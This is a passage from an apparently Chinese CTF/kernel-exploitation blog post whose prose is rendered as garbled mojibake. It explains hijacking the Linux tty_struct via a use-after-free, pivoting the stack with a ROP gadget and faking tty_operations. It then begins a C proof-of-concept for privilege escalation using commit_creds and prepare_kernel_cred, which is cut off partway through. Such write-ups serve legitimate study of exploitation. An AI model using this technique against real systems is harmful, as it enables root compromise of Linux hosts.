arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">3</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readFun</span><span class="params">(<span class="keyword">int</span> fd, struct editNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">4</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>






        <h1 id="äºŒã€åŠ«æŒtty-structç»“æ„ä½“"   >
          <a href="#äºŒã€åŠ«æŒtty-structç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€åŠ«æŒtty-structç»“æ„ä½“" class="headerlink" title="äºŒã€åŠ«æŒtty_structç»“æ„ä½“"></a>äºŒã€åŠ«æŒtty_structç»“æ„ä½“</h1>
      <p>è¿™ä¸ªçœŸæ˜¯è°ƒäº†æˆ‘æ— æ•Œä¹…ã€‚</p>

        <h2 id="åŸç†"   >
          <a href="#åŸç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2>
      
        <h3 id="1-å‡½æ•°è°ƒç”¨é“¾"   >
          <a href="#1-å‡½æ•°è°ƒç”¨é“¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‡½æ•°è°ƒç”¨é“¾" class="headerlink" title="1.å‡½æ•°è°ƒç”¨é“¾"></a>1.å‡½æ•°è°ƒç”¨é“¾</h3>
      <p><code>entry_SYSCALL_64</code>-&gt;<code>SyS_write</code>-&gt;<code>SYSC_write</code>-&gt;<code>vfs_write</code></p>
<p>-&gt;<code>__vfs_write</code>-&gt;<code>tty_write</code>-&gt;<code>do_tty_write</code>-&gt;<code>n_tty_write</code>-&gt;<code>pty_write</code></p>
<p>è¿™é‡Œæˆ‘ä»¬éœ€è¦çš„å°±æ˜¯åŠ«æŒæŸä¸ªç»“æ„ä½“ï¼Œä»è€Œä½¿å¾—åŸæœ¬é€šè¿‡è¯¥ç»“æ„ä½“è°ƒç”¨<code>pty_write</code>å‡½æ•°æŒ‡é’ˆå˜ä¸ºè°ƒç”¨æˆ‘ä»¬çš„ROPé“¾æ¡ã€‚</p>

        <h3 id="2-åŠ«æŒæ ˆ"   >
          <a href="#2-åŠ«æŒæ ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åŠ«æŒæ ˆ" class="headerlink" title="2.åŠ«æŒæ ˆ"></a>2.åŠ«æŒæ ˆ</h3>
      <p>ç”±äºç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´å¾—è¿”å›è¿›å…¥éœ€è¦ç”¨åˆ°æ ˆï¼Œæ‰€ä»¥ä¸€èˆ¬éœ€è¦è¿›è¡Œæ ˆåŠ«æŒï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“é€šè¿‡ptmxè¿›å…¥å…¶writeå‡½æ•°æ—¶ï¼Œraxä¸ºä»tty_structä¸­è·å–çš„operations* opsæŒ‡é’ˆï¼Œè€Œæ­¤æ—¶è¯¥æŒ‡é’ˆå·²ç»è¢«æˆ‘ä»¬åŠ«æŒäº†ï¼Œæ‰€ä»¥å¦‚æœæœ‰ç±»ä¼¼äºmov rsp,raxä¹‹ç±»çš„gadgetå°±èƒ½å°†æ ˆåŠ«æŒåˆ°æˆ‘ä»¬å¯æ§çš„operations* opsæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å¤„ï¼Œé‚£ä¹ˆä¹‹åå°±å¾ˆå®¹æ˜“è¿›è¡Œå†…æ ¸å’Œç”¨æˆ·ç©ºé—´çš„è½¬æ¢ã€‚</p>
<p>è¿™é‡Œå°±ç”¨åˆ°å¸¸ç”¨çš„ä¸€ä¸ªgadget</p>
<p>movRspRax_decEbx_ret</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211011000009.png" alt="image-20211011000008800"></p>

        <h3 id="3-ç»“æ„ä½“"   >
          <a href="#3-ç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ç»“æ„ä½“" class="headerlink" title="3.ç»“æ„ä½“"></a>3.ç»“æ„ä½“</h3>
      <p>è¿™ä¸ªä¹‹å‰ä¹Ÿæ˜¯è®²è¿‡çš„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span> <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span> <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span> <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>, <span class="comment">/* flow_lock */</span></span><br><span class="line">        flow_stopped:<span class="number">1</span>,</span><br><span class="line">        unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>, <span class="comment">/* ctrl_lock */</span></span><br><span class="line">        packet:<span class="number">1</span>,</span><br><span class="line">        unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room; <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">int</span> alt_speed; <span class="comment">/* For magic substitution of 38400 bps */</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å½“æˆ‘ä»¬æ‰“å¼€ptmxè®¾å¤‡æ—¶ï¼Œä¼šä½¿ç”¨kmallocç”³è¯·è¿™ä¸ªtty_structç»“æ„ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªUAFæ¼æ´ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†è¯¥tty_structç”³è¯·ä¸ºæˆ‘ä»¬é‡Šæ”¾æ‰çš„ä¸€ä¸ªchunkï¼Œå…¶ä¸­é‡è¦çš„æ˜¯int magic;å’Œconst struct tty_operations *ops;è¿™ä¸¤ä¸ªç»“æ„ä½“æˆå‘˜ã€‚</p>

        <h4 id="magicæˆå‘˜"   >
          <a href="#magicæˆå‘˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#magicæˆå‘˜" class="headerlink" title="magicæˆå‘˜"></a>magicæˆå‘˜</h4>
      <p>è¿™ä¸ªåœ¨ç½‘ä¸Šå¾ˆå¤šäººéƒ½ç›´æ¥å°†å…¶è®¾ç½®ä¸º0ï¼Œä½†æ˜¯åœ¨æŸäº›ç‰ˆæœ¬ä¸­ï¼Œå¦‚æœç›´æ¥è®¾ç½®ä¸º0ï¼Œé€šå¸¸å¯èƒ½å‡ºç°ä»¥ä¸‹çš„é”™è¯¯ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233212.png" alt="image-20211010233205104"></p>
<p>ä¹Ÿå°±æ˜¯magic numberæ£€æµ‹é”™è¯¯ï¼Œè¿™ä¸ªç»è¿‡è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå®é™…ç”³è¯·ç»“æ„ä½“ä¹‹åæ˜¯ä¸å˜çš„ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233737.png" alt="Snipaste_2021-10-10_23-37-19"></p>
<p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„æ•°å€¼</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233844.png" alt="image-20211010233844033"></p>
<p>è¿™ä¸ªåœ¨åé¢çš„æ•°å€¼è®¾ç½®ä¸­å¯ä»¥ç”¨åˆ°ï¼Œéœ€è¦æˆ‘ä»¬æ¥è°ƒè¯•æ‰å¯ä»¥ï¼Œä¸ç„¶å…¶å®å¦‚æœç›´æ¥è®¾ç½®ä¸º0ä¹Ÿå®¹æ˜“å‡ºé”™ã€‚</p>
<p>å¦å¤–å…¶ä¸­çš„driverå¯ä»¥è®¾ç½®ä¸º0ï¼Œæ‰€ä»¥ä¸€èˆ¬ç›´æ¥è®¾ç½®tty_struct[3]å’Œtty_struct[0]å³å¯ã€‚</p>

        <h4 id="opsæˆå‘˜"   >
          <a href="#opsæˆå‘˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#opsæˆå‘˜" class="headerlink" title="opsæˆå‘˜"></a>opsæˆå‘˜</h4>
      <p>è¿™ä¸ªconst struct tty_operations *opsç»“æ„ä½“æŒ‡é’ˆåœ¨è¯¥åšæ³•é‡Œè¢«åŠ«æŒä¸ºæˆ‘ä»¬è®¾ç½®fake_operationsæŒ‡é’ˆï¼Œæœ‰å¦‚ä¸‹ç»“æ„ä½“ï¼Œè®¾ç½®fake_operationsä¸­çš„writeå‡½æ•°æŒ‡é’ˆä¸ºROPé“¾æ¡ï¼Œå°±å¯ä»¥é€šè¿‡è°ƒç”¨ptmxè®¾å¤‡ä¸­çš„writeå‡½æ•°ï¼Œä»è€Œè°ƒç”¨åˆ°æˆ‘ä»¬è®¾ç½®çš„ROPé“¾æ¡ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">    <span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span> (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*write)(struct tty_struct * tty,</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span> (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*ioctl)(struct tty_struct *tty,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">    struct serial_icounter_struct *icount);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>



<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010234216.png" alt="image-20211010234216013"></p>

        <h3 id="4-æœ€ç»ˆç»“æ„"   >
          <a href="#4-æœ€ç»ˆç»“æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æœ€ç»ˆç»“æ„" class="headerlink" title="4.æœ€ç»ˆç»“æ„"></a>4.æœ€ç»ˆç»“æ„</h3>
      
        <h4 id="fake-tty-structç»“æ„ä½“"   >
          <a href="#fake-tty-structç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#fake-tty-structç»“æ„ä½“" class="headerlink" title="fake_tty_structç»“æ„ä½“"></a>fake_tty_structç»“æ„ä½“</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235018.png" alt="image-20211010235017786"></p>

        <h4 id="fake-tty-operationç»“æ„ä½“"   >
          <a href="#fake-tty-operationç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#fake-tty-operationç»“æ„ä½“" class="headerlink" title="fake_tty_operationç»“æ„ä½“"></a>fake_tty_operationç»“æ„ä½“</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235328.png" alt="image-20211010235311913"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235417.png" alt="image-20211010235416812"></p>

        <h2 id="POC-2"   >
          <a href="#POC-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *(*<span class="title">prepare_kernel_cred_t</span>) (<span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">daemon</span>) __<span class="title">attribute__</span>((<span class="title">regparm</span>(3)));</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*<span class="keyword">commit_creds_t</span>)</span> <span class="params">(struct cred *<span class="keyword">new</span>)</span> __<span class="title">attribute__</span><span class="params">((regparm(<span class="number">3</span>)))</span></span>;</span><br><span class="line"><span class="keyword">prepare_kernel_cred_t</span>   prepare_kernel_cred;</span><br><span class="line"><span class="keyword">commit_creds_t</span>    commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_ss;</span><br><span 